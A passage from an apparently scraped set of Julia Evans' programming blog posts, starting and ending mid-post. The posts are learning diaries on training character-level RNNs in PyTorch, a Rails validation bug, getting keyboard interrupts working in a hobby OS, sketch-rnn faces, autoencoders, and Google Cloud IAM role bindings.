a multiple of the gradient (since this is\ngradient descent). The multiple of the gradient that you use is called the  learning rate  – it’s basically  parameters -= learning_rate * gradient \n machine learning model training is a lot like general continuous function\noptimization in that finding the “right” step size to do gradient descent is\nbasically impossible so there are a lot of heuristics for picking step\nlearning rates that will work. One of these heuristics is called  Adam \n \n\n if you set your learning rate too high, the model won’t learn anything \n\n So back to our original problem: when I was training my model to generate\nShakespeare, I noticed that my model wasn’t learning anything! By “not learning\nanything”, I mean that the value of the loss function was not going down over\ntime. \n\n I eventually figured out that this was because my learning rate was too high!\nIt was 0.01 or something, and changing it to more like 0.002 resulted in more learning progress. Hooray! \n\n I started to generate text like this: \n\n  erlon, w oller. is. d y ivell iver ave esiheres tligh? e ispeafeink\n teldenauke'envexes. h exinkes ror h. ser. sat ly. spon, exang oighis yn, y\n hire aning is's es itrt. for ineull ul'cl r er. s unt. y ch er e s out twiof\n uranter h measaker h exaw; speclare y towessithisil's  aches? s es, tith s aat\n \n\n which is a big improvement over what I had previously, which was: \n\n kf ;o 'gen '9k ',nrhna 'v ;3; ;'rph 'g ;o kpr ;3;tavrnad 'ps ;]; ;];oraropr\n;9vnotararaelpot ;9vr ;9\n \n\n But then training stalled again, and I felt like I could still do better. \n\n resetting the state of the optimizer is VERY BAD \n\n It turned out that the reason training had stalled the second time was that my code looked like this: \n\n for i in range(something):\n    optimizer = torch.optim.Adam(rnn.parameters())\n    ... do training things\n \n\n I’d written the code this way because I didn’t realize that the state of the\noptimizer (“Adam”) was important, so I just reset it sometimes because it seemed\nconvenient at the time. \n\n It turns out that the optimizer’s state is very important, I think because it slowly\nreduces the training rate as training progresses. So I reorganized my code so\nthat I only initialized the optimizer once at the beginning of training. \n\n I also made sure that when I saved my model, I also saved the optimizer’s state: \n\n torch.save({'model_state_dict': rnn.state_dict(), 'optimizer_dict': optimizer.state_dict()}, MODEL_PATH)\n \n\n Here’s the “Shakespeare” the model was generating after I stopped resetting the optimizer all the time: \n\n at soerin, I kanth as jow gill fimes, To metes think our wink we in fatching\nand, Drose, How the wit? our arpear War, our in wioken alous, To thigh dies wit\nstain! navinge a sput pie, thick done a my wiscian. Hark's king, and Evit night\nand find. Woman steed and oppet, I diplifire, and evole witk ud\n \n\n It’s a big improvement! There are some actual English words in there! “Woman\nsteed and oppet!” \n\n that’s it for today! \n\n Tomorrow my goal is to learn what “BPTT” means and see if I can use it to train\nthis model more quickly and maybe give it a bigger hidden state than 87\nparameters. And once I’ve done that, maybe I can start to train more interesting models!! \n\n"},
{"url": "https://jvns.ca/blog/2020/11/09/day-1--a-little-rails-/", "title": "Day 1: a confusing Rails error message", "content": "\n     \n\n Today I started an Recurse Center batch! I got to meet a few people, and started on a tiny\nfun Rails project. I think I won’t talk too much about what the project actually is\ntoday, but here are some quick notes on a day with Rails: \n\n some notes on getting started \n\n The main thing I learned about setting up a Rails project is that \n\n \n it uses sqlite by default, you have to tell it to use Postgres \n there are a ton of things that Rails includes by default that you can disable. \n \n\n I installed and  rm -rf ’d Rails maybe 7 times before I was satisfied with it and ended up with this incantation: \n\n rails new . -d postgresql --skip-sprockets --skip-javascript`\n \n\n Basically because I definitely wanted to use Postgres and not sqlite, and\nskipping sprockets and javascript seemed to make installing Rails faster,\nand I figured I could install them later if I decided I wanted them. \n\n the official Rails guide is really good \n\n I used 2 main resources for creating my starter Rails app: \n\n \n DHH’s original Rails talk from 2005\n https://www.youtube.com/watch?v=Gzj723LkRJY  (which I didn’t watch this time,\nbut I watched the last time I spent a day with Rails, and I found it pretty\ninspiring and helpful) \n The official Rails “getting started” guide, which seems pretty short and clear\n https://guides.rubyonrails.org/v5.0/getting_started.html \n \n\n a mysterious error message:  undefined method 'user' \n\n I love bugs, so here’s a weird Rails error I ran into today! I had some code that looked like this: \n\n @user = User.new(user_params)\n@user.save\n \n\n Pretty simple, right? But when that code ran, I got this baffling error message: \n\n undefined method `user' for #<User:0x00007fb6f4012ab8> Did you mean? super \n \n\n I was EXTREMELY confused about what was going on here because I hadn’t  called \na method called  user . I’d called  .save . What???? I stayed confused and\nfrustrated about this for maybe 20 minutes, and then finally I looked at my\n User  model and found this code: \n\n class User < ApplicationRecord\n  has_secure_password\n\n  validates :user, presence: true, uniqueness: true\nend\n \n\n validates :user...  was  supposed  to be some Rails magic validating that every  User  had a\n username , and that usernames had to be unique. But I’d made a typo, and I’d written\n  user  and not  username . I fixed this and then everything worked! hooray! \n\n I still don’t understand how I was supposed to debug this though: the stack\ntrace told me the problem was with the  @user.save  line, and never mentioned\nthat  validates :user  thing at all. I feel like there must be a way to debug\nthis but I don’t know what it is. \n\n The whole point of me playing with Rails is to see how the Rails magic plays\nout in practice so this was a fun bug to hit early on. \n\n a simple user management system \n\n I decided I wanted users in my toy app. Some Googling showed me that\nthere’s an extremely popular gem called\n devise  that handles users. I found the\nREADME a little overwhelming and I knew that I wanted a very minimal user\nmanagement system in my toy app, so instead I followed this guide called\n Authentication from Scratch with Rails\n5.2 \nwhich seems to be working out so far. Rails seems to already have a bunch of\nbuilt in stuff for managing users – I was really surprised by how short that guide was and how little code I needed to write. \n\n I learned while implementing users that Rails has a built in magical session\nmanagement system (see  How Rails Sessions\nWork . By\ndefault all the session data seems to be stored in a cookie on the user’s\ncomputer, though I guess you can also store the session data in a database if\nit gets too big for a cookie. \n\n It’s definitely kind of strange to already have a session management system and\ncookies and users without quite knowing what’s going on exactly, but it’s also kind of fun! We’ll see how it goes. \n\n tomorrow: more rails! \n\n Maybe tomorrow I can actually make some progress on implementing my fun rails\napp idea! \n\n"},
{"url": "https://jvns.ca/blog/2013/12/04/day-37-how-a-keyboard-works/", "title": "Day 37: After 5 days, my OS doesn't crash when I press a key", "content": "\n     \n\n Right now I’m working towards being able to: \n\n \n press keys on my keyboard \n having the OS not crash \n and have the key I pressed be echoed back \n \n\n I just achieved step 2, and this has been kind of a saga, so here’s an\nexplanation of the blood and tears involved. First up, some resources\nthat really helped me out: \n\n \n The fantastic  OSDev wiki . \n This\n tutorial on how to make a basic x86 kernel ,\nespecially the IDT page. \n This  other Rust kernel ,\nmostly for Rust coding style. \n Most of all: the OSDev wiki page\n “I Can’t Get Interrupts Working” .\nRead this three times every time you have a problem. For real. \n \n\n So here’s how I did it. There were a lot of pitfalls. Notably absent\nare the hours I spent in the Rust IRC channel being confused about\ntypes. \n\n How To Get Interrupts Working, Julia’s Way \n\n \n Create a Global Descriptor Table (GDT) and load it ( source ) \n Switch from Real Mode to Protected Mode .\nThis involves turning interrupts off ( cli ). \n Create a Interrupt Descriptor Table (IDT) and load it. \n Put interrupt handlers into my table. \n Press keys. Nothing happens. Hours pass. Realize interrupts are\nturned off and I need to turn them on. \n Turn interrupts on ( sti ). \n Press a key. The OS crashes. Continue experimenting in this\nvein for some time. Still crashing. \n Take the advice from  “I Can’t Get Interrupts Working” \nand trigger the interrupts  manually  (with  int 1 ) before\nturning interrupts back on and trying it for real. Get my interrupt\ndescriptor table not broken. Sweet. \n Turn interrupts on ( sti ). \n The OS AGAIN crashes every time i press a key. Read “I Can’t\nGet Interrupts Working” again. This is called “I’m receiving EXC9\ninstead of IRQ1 when striking a key?!” Feel on top of this. \n Remap the PIC  so that interrupt  i \ngets mapped to  i + 32 , because of an Intel design bug. This\n basically  looks like just typing in a bunch of random numbers,\nbut it works. \n THE OS IS STILL CRASHING WHEN I PRESS A KEY. This continues for 2\ndays. \n Remember that now that I have remapped interrupt 1 to interrupt 33\nand I need to update my IDT. \n Update my IDT. \n Press a key. My interrupt handler runs. Practically faint with joy. \n But it only runs the first time I press a key, not the second\ntime. This is the section “I can only receive one IRQ” \n \n\n As far as I can tell this is all totally normal and just how OS\nprogramming is. Or something. Hopefully by the end of the week I will\nget past “I can only receive one IRQ” and into “My interrupt handler\nis the bomb and I can totally write a keyboard driver now”. \n\n Then I’m going to write a keyboard driver where in addition to doing\nnormal keyboard driver things, it changes the screen colour every time\nI press a key. ( Kate ’s idea) \n\n I’m seriously amazed that operating systems exist and are available\nfor free. \n\n Edit:  Thanks for all the help everyone! I’ve solved “It only runs\nthe first time I press a key” now and moved on to new problems :) \n\n"},
{"url": "https://jvns.ca/blog/2020/11/16/day-5--lots-of-faces-with-sketch-rnn/", "title": "Day 5: drawing lots of faces with sketch-rnn", "content": "\n     \n\n Hello! This week it’s generative art week at RC, and I thought it would be fun\nto generate drawings of faces. \n\n Someone suggested the  Google Quickdraw  dataset, which has a lot\nof pictures of faces. And even though I think most of the faces in there are\nnot really that interesting, I really quite like some of them, like these two: \n\n \n \n\n So that seems like somewhere to start! \n\n step 1: get the sketch-rnn model \n\n sketch-rnn is an RNN trained on the quickdraw dataset that generates line\ndrawings. You can see it in action in Monica Dinculescu’s very fun  magic\nsketchpad  demo here – you start making a\ndrawing, and it’ll complete you drawing as a cat / bridge / whatever you want. \n\n I figured that would be a fun place to start, and  ml5js  has a  tutorial showing how to write Javascript code to draw things with sketch-rnn , which I followed. \n\n step 2: make the tutorial code use async/await \n\n The ml5js example had a bunch of global variables and callbacks and I found it\ndifficult to work with, so I spent a while refactoring it to use async/await so\nthat I could play around with it more easily. This took a while but I got it to\nwork. \n\n step 3: make sketch-rnn draw lots of faces and put them into a gallery \n\n I started out with making a more interactive website, but decided to instead do\nsomething really simple to start: just get the model to draw a lot of faces and\nsee how I felt about them. \n\n Here’s the resulting (very janky, not responsive) website I made, which draws faces\nand then puts them into a little “gallery” on the right:\n lots of sketch-rnn faces . You can see it “live” drawing the faces which is fun. \n\n The set of images that comes out looks something like this: \n\n \n\n I don’t really like  any  of these faces, but it’s a start! It’s also very slow\non my 2015 laptop, but faster on the iPad. I didn’t spend a lot of time\nprofiling it, but it seems to spend a lot of time in some function with  lstm \nin its name – I don’t know what an LSTM is exactly but I know it’s a component\nof an RNN, so I guess (as you’d expect) it just has a lot of math to do in\nJavascript to calculate the next line to draw and that’s slow. \n\n next step: maybe find out if sketch-rnn can tell the difference between “interesting” and “boring” faces \n\n I think that this face: \n\n \n\n is a lot more interesting than this face: \n\n \n\n Can I convince the neural network to distinguish between faces that I think are\n‘interesting’ and ‘boring’ and maybe only generate more “interesting” faces?\nWe’ll see! Right now I am stuck on trying to get a pre-trained model loaded\ninto Python, so there’s a long way to go. \n\n I did find someone who’d done something kind of similar, on  bad flamingos vs good flamingos  in the quickdraw dataset. \n\n I still don’t really know anything about RNNs, but maybe if I can answer this\nquestion I will learn something about them. \n\n also there’s a refrigerator poetry forum \n\n Here’s that refrigerator poetry forum I was talking about last week:\n https://refrigerator-poetry-forum.herokuapp.com/ . You can write magnet\npoetry-style poems on a refrigerator. People wrote some charming poems and I’m\nhappy with it. I think I might use Rails for another project in the future. \n\n Hopefully people won’t abuse it, if there’s abuse I’ll just take it off the\ninternet probably. \n\n"},
{"url": "https://jvns.ca/blog/2020/11/18/how-to-do-hard-projects--start-with-something-that-works/", "title": "Day 8: Start with something that works", "content": "\n     \n\n Today at RC I’m a little stuck so here’s a very short reflection on how to do\nhard programming problems :) \n\n I was talking to a friend yesterday about how to do programming projects that\nare a bit out of your comfort zone, and I realized that there’s a pattern to how\nI approach new-to-me topics! Here I’m especially thinking about little side\nprojects where you want to get the thing done pretty efficiently. \n\n When I start on a new project using some technology I haven’t worked with\nbefore, I often: \n\n \n Find some code on the internet that already does something a little like\nwhat I want \n Incrementally modify that code until it does what I want, often completely\nchanging everything about the original code in the process \n \n\n Here are a couple of quick thoughts about this process: \n\n it’s important that the initial code  works \n\n Often when I’m out looking for examples, I’ll find a lot of code that I can’t\nget to work quickly, often because the code is kind of old and things have\nchanged since then. Whenever possible, I try to find code that I can get to\nwork on my computer pretty quickly. \n\n It’s been pretty helpful to me to give up relatively quickly on code that I\ncan’t get to work right away and look for another example – often there is\nsomething out there that’s more recent and that I can get to work more quickly! \n\n you have to be able to incrementally change the code into what you want \n\n Today I’ve been working with some neural network code, and one thing I’m really\nstruggling with for the last couple of days is that I find it pretty easy to\nfind somewhat relevant Jupyter notebooks that do RNN things, and pretty hard to\nmodify those examples to do something closer to what I want. They keep breaking\nand I then don’t know how to fix them. \n\n Last week I was working on a Rails app, which I think is something that’s very\neasy to incrementally change into the program you want:  rails new  gives you a\nwebserver that does almost nothing, but it works! And then you just need to\nchange it one tiny step at a time into the website you want to build. \n\n examples of “something that works” \n\n \n If you want to write a window manager,\n tinywm  is a window manager in 50 lines of C! \n this tiny kernel written in Rust that does nothing was a fun starting point\nfor an operating system  https://github.com/charliesome/rustboot  (probably it’s not a good starting point today) \n rails new , like I talked about above \n I love that  https://glitch.com/  projects let you “view source” on the backend of any Glitch project \n Jupyter notebooks, like  these great NLP tutorials by Allison Parrish \n \n\n that’s all! \n\n I think little starting points like this are so important and can be really\nmagical. Finding the right starting point can be hard, but when I find a good\none it makes everything so much easier! \n\n"},
{"url": "https://jvns.ca/blog/2020/11/19/day-9--generating-a-lot-of-nonsense-with-an-rnn/", "title": "Day 9: Generating a lot of nonsense with an RNN", "content": "\n     \n\n Hello! On Monday I posted about  generating faces with\nsketch-rnn , which I did using a\npre-trained RNN model. \n\n I want to train that model to generate more complicated faces (which may or may\nnot work!), but I decided that since I knew literally nothing about neural\nnetworks it would be good to start with\nsomething simpler:  this char-rnn model from Karpathy that generates text that\nsounds vaguely\nShakespearean . \n\n After spending some time playing with Tensorflow, I decided to use\nPyTorch with the  fast.ai  helper libraries because it’s\nwhat my friend Ray was using for his project. \n\n Here are some initial things I’ve learned about training neural networks. All\nof this is pretty disjointed and I still have no idea what I’m doing. \n\n there are a lot of tensors \n\n All the data seems to be tensors! A 1-d tensor is a vector, a 2-d tensor is a\nmatrix, and a 3-d tensor is, well, who knows. This is a little new but I have\nsome vague intuition about tensor products from learning about quantum\ncomputing ten  years  ago so this\nseems okay. \n\n They seem not too bad to manipulate, like  tensor.flatten()  will flatten a\nmultidimensional tensor into a vector. I still feel a bit uncertain about the\nexact order things get flattened in, I need to experiment & think it through. \n\n The word “dimension” for tensors is also used in a different way than I\nexpected, like I’d usually think that the “dimension” of a 8x9 matrix is 72\n(because that’s the dimension of the vector space of 8x9 matrices), but in\nTorch land the “dimension” of a 8x9 matrix seems to be 2. That seems fine\nthough. \n\n there are a lot of dimension mismatches \n\n I’ve spent a lot of hours over the last couple of days staring at error\nmessages like \n\n ValueError: Expected target size (77, 64) got torch.Size (77, 70)\n \n\n Some reasons I’ve gotten errors like this so far \n\n \n I tried to pass a 3-dimensional tensor to a loss function that wanted a\n2-dimensional tensor \n I forgot to embed my input data (which is a bunch of class labels) into a\nhigher dimensional space so that every number turns into a 64-dimensional\nvector \n I multiplied a vector by a matrix with the wrong dimensions \n \n\n Something that I find a bit confusing about the tensors and dimension mismatches\nis that a lot of the time you seem to be able to pass in both a 2-dimensional\ntensor and a 3-dimensional tensor to the same method. For example, if I have a\n2x3 matrix, I can multiply that by  a 3x4 tensor, or by a 3x4x89 tensor, or by\na 3x92x12x238 tensor, or whatever. This corresponds to what I remember about tensors\nfrom quantum computing, but I find a bit harder to think about in terms of\nnumbers in a matrix on a computer. \n\n I tweeted about this and a bunch of people agreed with me that they have also\nspent a bunch of time debugging dimension mismatches so at least I’m not alone\n:) \n\n the cross entropy loss in pytorch isn’t the cross entropy \n\n A “loss function” is basically a function you use to check how similar 2\nvectors are. Lower is better. \n\n Today I got pretty confused because I was trying to compute the cross entropy\nloss for two identical vectors, and the result wasn’t 0! I thought that the\nresult was going to be 0, because the vectors were identical! \n\n It turns out that in PyTorch the “cross entropy loss” of x and y isn’t actually\nthe  cross entropy  of x and y\n(which would be 0 if x and y are identical!), instead it’s\n cross_entropy(softmax(x), y)  – you apply a “softmax” function to x first. \n\n it goes a LOT faster with a GPU \n\n At some point I was training a model on a CPU, and then I switched to a GPU and\nevery batch trained literally 10x faster. \n\n colab is pretty useful \n\n I’ve been using Google’s  Colab , which\nseems to be a fork of Jupyter notebook. It comes with some free GPUs that you\ncan use, which is nice. \n\n The main annoying thing I’ve run into about Colab is that they pretty\naggressively kill your running notebooks if they’re idle to reduce resource\nusage. This is actually fine on its own (you can save your data to Google Drive\nand restore it!). \n\n BUT as far as I can tell, if I want to use the Google Drive to get my files, I\nneed to reauthenticate the notebook to Google Drive every single time by\nclicking a link and pasting in an OAuth (or something) code. I don’t really\nunderstand why it can’t just authenticate me once and then have it work forever. \n\n it’s bad if your training loss never goes down \n\n I’ve been having the same problem for most of yesterday and today, which is\nthat I have a model and some training data, and when I try to train the model\nmy training loss never improves, which means that basically the model isn’t\ntraining. \n\n And then when I make predictions from the model, I get results like this: \n\n eto e  enaih eet codosueonites st tne   esee ob nmnoesnrertieieeu  ooe\n \n\n This makes it seem like it’s learned  something   – those letters are common\nletters in the English language, sure! It’s better than generating\n zxisqqqqxw , which is more like the results I’d expect if the network hadn’t\nlearned anything at all. But it definitely hasn’t learned a lot. \n\n some code that does not work \n\n If you’re interested in what some code for an RNN that DOES NOT WORK looks\nlike, here’s  the code I’ve written so far \n\n the neural network part looks like this: \n\n class RNN(nn.Module):\n    def __init__(self):\n        super().__init__()\n        self.i2h = nn.Linear(nv, nh) # Wxh\n        self.h2h = nn.Linear(nh, nh) # Whh\n        self.h2o = nn.Linear(nh, nv) # Why\n        self.hidden = torch.zeros(1, nh).cuda()\n\n    def forward(self, input):\n        x = self.i2h(torch.nn.functional.one_hot(input, num_classes=nv).type(torch.FloatTensor).cuda())\n        y = self.h2h(self.hidden)\n        hidden = torch.tanh(y + x)\n        self.hidden = hidden.detach()\n        z = self.h2o(hidden)\n        return z\n \n\n and it basically sets up a bunch of matrices that are meant to correspond to this code from Karpathy’s blog post: \n\n   def step(self, x):\n    # update the hidden state\n    self.h = np.tanh(np.dot(self.W_hh, self.h) + np.dot(self.W_xh, x))\n    # compute the output vector\n    y = np.dot(self.W_hy, self.h)\n    return y\n \n\n but unlike his code, it does not generate text that looks vaguely Shakespeare\nafter I train it, it generates gibberish! Maybe tomorrow I will find out why. \n\n Here’s a snippet of code that samples from the model’s output probability vector using a\n“temperature” – at a very low temperature it just always picks the letter that\nthe model thinks is most likely (which by the way right now in my case is\nLITERALLY ALWAYS A SPACE which is also a sign that something is wrong). At\nhigher temperatures it might pick another likely letter. \n\n temperature = 1\nprediction_vector = F.softmax(learn.model(x)[0]/temperature)\nv.textify(torch.multinomial(prediction_vector, 1).flatten(), sep='')\n \n\n that’s all! \n\n As usual when I learn things I am mostly trying to do it without reading any\nbooks or watching any videos – there’s this whole video course from\n https://fast.ai  that seems pretty good, but for whatever reason I prefer to\njust bang my head against a problem I’m trying to solve until I get VERY\nCONFUSED and then resort to reading things that might help me understand\nwhat’s going on then. So that’s the plan, we’ll see how it goes. \n\n It’s been pretty fun so far, I know a bunch of things about loss functions that\nI didn’t know before at least, and now I kind of know what a softmax is! \n\n"},
{"url": "https://jvns.ca/blog/2020/12/03/day-18--some-answers-to-autoencoder-questions/", "title": "Day 18: an answer to an autoencoder question", "content": "\n      I’m going to keep this one short because I want to get back to coding! \n\n One of the questions I had in the last post was: \n\n \n The  Encoder  class in the translation tutorial outputs 2 vectors, an output and a hidden vector. Which one is the encoding, the output or the hidden vector? (or both???) \n \n\n I’ve been struggling a bit to find out the answers to questions like this –\nthere are 10 million blogs about deep learning, but somehow I feel like they\noften don’t answer my questions. My best strategy so far has to been to search\nthe PyTorch forums, and that’s how I found the answer to this one! I searched for something like “autoencoder” and found  this answer \n\n The answer to that question is that the hidden vector is the encoding, and you\njust throw out the output. \n\n That answer helped me a LOT and I managed to get a simple autoencoder to work\nonce I had the answer!  It’s always surprising to me every single time how\nhelpful it is to focus and articulate the questions I have. \n\n I still don’t know what the  relu  is for, but it’s nice to have the answer to\nat least one question. \n\n"},
{"url": "https://jvns.ca/blog/2020/12/05/day-20--trying-to-run-a-rails-app-in-google-cloud-run/", "title": "Day 20: trying to figure out how Google Cloud IAM works", "content": "\n     \n\n Hello! I spent all day on Friday trying to run a Rails app in Google Cloud run\nand I partially succeeded, so I wanted to write down the main points I found\nconfusing. \n\n Google Cloud’s IAM is different from AWS IAM \n\n I’ve worked with AWS IAM a lot, and GCP’s IAM seems pretty different. The way\nI’m used to IAM working in AWS is: \n\n \n You create an IAM role for a service/machine/whatever \n You give permissions to that IAM role (like “this role can access this S3 bucket”) \n That’s it \n \n\n As far as I can tell, with Google Cloud both the terminology used in IAM and\nthe way it works is different. \n\n Here are the mappings (as far as I can tell) from GCP IAM concepts to AWS IAM concepts \n\n \n an “IAM role” in Google Cloud is like a “permission” in AWS (NOT like an AWS\nIAM role). So for example  roles/cloudsql.client  lets you access SQL instances \n a “service account” in Google Cloud is kiiiind of like a “IAM role” in AWS –\nit’s the identity of a service. I think there are some pretty significant\ndifferences though. \n \n\n So “IAM role” in GCP and “IAM role” in AWS have completely different meanings.\nCool, that’s fine, we can work with that. \n\n how to assign a GCP IAM role to a service account \n\n Like I said before, assigning an AWS permission to an AWS IAM role is pretty\nsimple ( here’s the terraform to do\nit . \n\n I thought it would be the same in GCP (“just assign a role to a service\naccount”), but it’s completely different. \n\n Instead of there being 1 single way to assign a permission to an identity (like\n“this service can do X and Y and Z”), the way you give a service\naccount access to a resource is different depending on the kind of resource. \n\n For example. Let’s say I want to give my service account access to a secret.\nHere’s the command line incantation to do that: \n\n gcloud beta secrets add-iam-policy-binding rails-master-key\n--member=serviceAccount:refrigerator-poetry@refrigerator-poetry.iam.gserviceaccount.com\n--role=roles/secretmanager.secretAccessor ```\n \n\n or in Terraform: \n\n resource \"google_secret_manager_secret_iam_binding\" \"binding\" {\n  project   = \"refrigerator-poetry\"\n  secret_id = google_secret_manager_secret.railsmaster.secret_id\n  role      = \"roles/secretmanager.secretAccessor\"\n  members = [\n    \"serviceAccount:${google_service_account.fridge.email}\"\n  ]\n}\n \n\n The general gcloud command line rule here seems to be (from  the GCP documentation on granting access ): \n\n gcloud GROUP add-iam-policy-binding RESOURCE --member=MEMBER --role=ROLE-ID\n \n\n Okay, this isn’t what I’d hoped for (a single JSON file or something where I\ncan specify everything my service account can access), but at least there’s a\npattern. We can work with that! \n\n ok, so what if we want to give a service account access to a SQL database? \n\n I used the above approach to give my service account access to the secrets it\nneeded access to. Hooray! \n\n Next I wanted to give a service account access to a SQL database. The pattern from before is: \n\n gcloud GROUP add-iam-policy-binding RESOURCE --member=MEMBER --role=ROLE-ID\n \n\n which seems like it should translate to something like \n\n gcloud sql instances add-iam-policy-binding my-db --member=serviceAccount:my-account@whatever --role=roles/cloudsql.client\n \n\n But it doesn’t.  gcloud sql instances add-iam-policy-binding  doesn’t exist,\nand  gcloud sql add-iam-policy-binding  doesn’t exist either. So it seems like\nif you want to give access to a SQL instance, you need to do something\ndifferent. \n\n At this point it was like 11:30PM so I gave up and granted my service account\nvery broad permissions on the project ( roles/editor ) because I just wanted to\nget something to work. \n\n Here’s what I ran: \n\n gcloud projects add-iam-policy-binding  PROJECT_NAME \\\n                              --member=serviceAccount:account-email@whatever --role=roles/editor\n \n\n and that worked! I still don’t know the correct way to grant access to a SQL\ninstance but that’s a fight for another day. At least I know you need to do\nsomething different than for other types of resources. \n\n the terraform IAM resources are apparently generated with ERB \n\n I spent many hours with Kamal trying to understand how this works, and  he went\nand figured out how the Terraform resources that assign roles to service\naccounts work. I was really surprised by this so here it is! \n\n In the GCP Terraform provider, there are dozens of different resources to\nassign a role to an identity, one for each different kind of GCP resource. (in\ncontract with AWS, where it’s just  aws_iam_role ,  aws_iam_policy ,  aws_iam_role_policy ). \n\n Here are just a few. \n\n google_folder_iam_binding\ngoogle_healthcare_dataset_iam_binding\ngoogle_healthcare_dicom_store_iam_binding\ngoogle_healthcare_fhir_store_iam_binding\ngoogle_iap_tunnel_iam_binding\ngoogle_iap_tunnel_instance_iam_binding\ngoogle_iap_web_backend_service_iam_binding\ngoogle_iap_web_iam_binding\ngoogle_iap_web_type_compute_iam_binding\ngoogle_kms_crypto_key_iam_binding\ngoogle_kms_key_ring_iam_binding\ngoogle_project_iam_binding\n \n\n So if you want to give a service account access to a  google_iap_web_backend \n(whatever that is), you use a  google_iap_web_backend_service_iam_binding .\nOkay! \n\n But there are all of these almost identical things, so how are they generated?\nAs promised in the section heading, it seems to be a bunch of Go code templated\nwith ERB. \n\n Kamal did a bunch of digging and found  this ERB\ntemplate \nwhich generates a giant Go program that defines all these resources. So I guess\nthat’s how they generate a lot of resources that are very similar. \n\n I still don’t really understand how this works \n\n My guess is that there are some upsides to the GCP approach to identity\nmanagement that I don’t understand yet – I’ve only used it for like 4 hours\nand I’ve spent a LOT more time using AWS IAM. \n\n But I still don’t really understand how to use it – I feel like there should\nbe a way to define “here are all the things this service account is allowed to\ndo” in a single place, but I haven’t found it yet. Maybe I’ll figure it out\nsoon! \n\n"},
{"url": "https://jvns.ca/blog/2020/12/01/day-17--trying-to-wrap-my-head-around-autoencoders/", "title": "Day 17: trying to wrap my head around autoencoders", "content": "\n     \n\n Hello! Right now I’m back to working on neural networks with sketches of\n faces . \n\n current goal: cluster the faces somehow \n\n As a starting point, I thought it’d be fun to, instead of generating faces, get\nthe neural network to do some unsupervised clustering of the faces! The idea is: \n\n \n Get the Machine Learning to cluster the faces into groups \n See if I like the faces in some groups more than others \n If I do, then maybe just train a model on the cluster of faces that I like \n \n\n how do you actually do clustering of a sequence of vectors though? \n\n The usual way to do clustering is with k-means or something, but these drawings\nof faces aren’t a single vector, they’re a sequence of vectors! So k-means\nwouldn’t make any sense. \n\n I Googled “rnn unsupervised clustering” a little bit and learned about a way to\ndo this: autoencoders! \n\n It seems like the way an autoencoder works at a high level is: \n\n \n Create “encoder” RNN that translates the input into a lower-dimensional vector (like 4 dimensions or something) \n Create a “decoder” RNN that translates the 4-dimensional \n \n\n Train both of them together, with the objective function being something like: \n\n loss = F.cross_entropy(decoder(encoder(input)), input)\n \n\n where we try to get  decoder(encoder(x))  as close to  x  as possible. \n\n I found a  tutorial on the PyTorch wiki talking about how to use this encoder /\ndecoder pattern to do\ntranslation \nfrom French to English. \n\n questions I still have about autoencoders \n\n I’m still pretty confused about how this encoder / decoder pattern actually\nworks, and I didn’t get very far on this today. So here are some\nquestions in the hopes that I can answer them tomorrow! \n\n \n when training, do I need to embed my original input vector into a higher\ndimensional space (with a  nn.Embedding )?  (I don’t think so, because they’re vectors and not\ninteger labels, but I’m not sure) \n The  Encoder  class in the translation tutorial outputs 2 vectors, an output\nand a hidden vector. Which one is the encoding, the output or the hidden\nvector? (or both???) \n Should my hidden vector have a lot of dimensions (like 50), or should it\nhave the same number of dimensions as I want classes to categorize my faces\ninto (like 5?) \n Both of the examples I’m looking at use a  relu  function as part of their\nneural networks. What does  relu  mean? \n \n\n tomorrow: maybe write a toy autoencoder! \n\n Maybe tomorrow I’ll try to do a simpler autoencoder example with some toy data,\nI think that might clarify things for me! As always trying to use a technique\nI don’t understand at all with a complicated dataset is really confusing and\ndemoralizing, I think if I simplify the dataset a LOT it should go better. \n\n"},
{"url": "https://jvns.ca/blog/2020/11/26/day-13--bptt---staring-at-graphs-a-lot/", "title": "Day 13: BPTT, and debugging why a model isn't training is hard", "content": "\n     \n\n Hello! I spent the last couple of days experimenting with using back\npropagation through time with RNNs. \n\n debugging “this isn’t training” is hard \n\n Yesterday I was training a model,and the loss over time looked like this: \n\n \n\n Basically, it went down for a while, and then it went back up a LOT. I still\nhave no idea why this happened: if the optimizer was struggling to optimize,\nI’d expect the loss to get stuck and plateau and maybe wobble around, but not\njust keep going up forever. This makes no sense to me yet. \n\n I drew a corresponding graph of the norm of the gradient of one of the weight\nmatrices to go with this, because I kept reading about “vanishing gradients”\nand “exploding gradients” and I wanted to see if I was suffering from them.\nHere’s the graph: \n\n \n\n I think this graph might be showing me a vanishing gradient – the norm of the\ngradient does get pretty small towards the end of the graph. \n\n BPTT: back-propagation through time \n\n I’ve been experimenting with a different way of training my RNN: instead of\nwriting code like this, which trains one character at a time. \n\n for input, target in training_data:\n    output, hidden = model(input, hidden)\n    loss = F.cross_entropy(output, target)\n    optimizer.zero_grad()\n    loss.backward() # calculate the derivative\n    optimizer.step() # adjust weights \n    hidden.detach()\n \n\n instead I’m giving it a bunch of data (ok, the sentence is ‘a’, ‘b’, ‘c’, ’d’,\n‘e’, ‘f’… ) and then only doing the gradient descent/backpropagation step\nperiodically. The code looks a little like this: \n\n for i, (input, target) in enumerate(training_data):\n    output, hidden = model(input, hidden)\n    # only do the optimizer step 10% of of the time\n    if random.randint(0, 10) == 2:\n        loss = F.cross_entropy(output, target)\n        optimizer.zero_grad()\n        loss.backward() # calculate the derivative\n        optimizer.step() # adjust weights \n        hidden.detach()\n \n\n Some questions I have about this: \n\n \n When I do BPTT after every 40 steps, the model fails to train (it has the\n“improve and then get worse” behaviour I graphed above), but when I do it\nafter 10 steps it works fine. Why? \n When I trained on (I think??) the same training data with the\none-character-at-a-time method, the model learned a lot of character names\n(like CYMBELINE). When training it with BPTT it seems not to have learned any\ncharacter names. I’m not yet sure if this is a difference in the training\ndata or if I need to do something different with the model. \n \n\n waiting for training to finish is frustrating \n\n I’ve spent way too much time over the last couple of days waiting 30 minutes\nfor a model to train so I can tell if it’s working or not. I’m not sure how to\nhandle this yet, but I need either a faster feedback loop or something to do\nwhile I’m waiting. \n\n I think the main reason this is frustrating is that I have a lot of hypotheses\nI want to experiment with, but it takes so long for every one and it’s a bit\nhard with a Jupyter notebook to keep track of all the hypotheses I’m trying to\ntrack. \n\n should I be doing gradient clipping? \n\n Recently I added “gradient clipping” to my training function. Basically I\nthink this means that if the norm of the gradient is bigger than some value\n(like 1), then the optimizer scales the gradient so that it has a smaller norm. \n\n It’s only one line of code, but I can’t tell if it’s helping yet \n\n torch.nn.utils.clip_grad_norm_(self.rnn.parameters(), 1)\n \n\n open questions \n\n I’m just going to recap some of my open questions for myself in case I can\nanswer them in the next post. 